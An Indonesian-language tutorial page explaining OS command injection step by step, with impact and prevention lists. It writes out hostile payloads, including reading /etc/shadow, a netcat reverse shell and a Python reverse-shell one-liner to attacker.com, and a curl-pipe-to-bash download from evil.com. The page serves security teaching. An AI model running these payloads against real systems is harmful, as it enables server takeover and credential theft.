⌨️ OS COMMAND INJECTION

Cara Kerja Command Injection

Input user dimasukkan ke perintah OS — karakter ; | && ` digunakan untuk chaining command berbahaya.

← DOM XSS🏠 Semua AnimasiLFI →
1
🔍 Menemukan fitur network tool
Ping tool, DNS lookup, traceroute, whois — fitur yang memanggil command OS di backend.
2
💉 Menyisipkan command separator
Menambahkan perintah tambahan setelah input normal:
domain=google.com; cat /etc/shadow
domain=x | nc attacker.com 4444 -e /bin/sh
domain=$(curl evil.com/backdoor.sh|bash)
3
⚙️ Server mengeksekusi command chain
nslookup google.com; cat /etc/shadow → KEDUA perintah dijalankan. OS memperlakukan ; sebagai pemisah command.
4
📡 Output perintah dikembalikan
Hasil dari cat /etc/shadow (password hash) ditampilkan di halaman bersama hasil nslookup.
5
🐚 Eskalasi ke reverse shell
Penyerang membuat koneksi shell interaktif:
; python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("attacker.com",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno())'
6
💥 Server takeover complete
Penyerang memiliki shell interaktif. Baca semua file, install backdoor, pivot ke server lain, deploy ransomware.

💀 Dampak

  • Full server access via reverse shell
  • Data exfiltration
  • Ransomware deployment
  • Lateral movement ke jaringan

🛡️ Pencegahan

  • Gunakan native language functions
  • Regex whitelist untuk input
  • escapeshellarg() jika harus shell
  • Run service sebagai non-root user
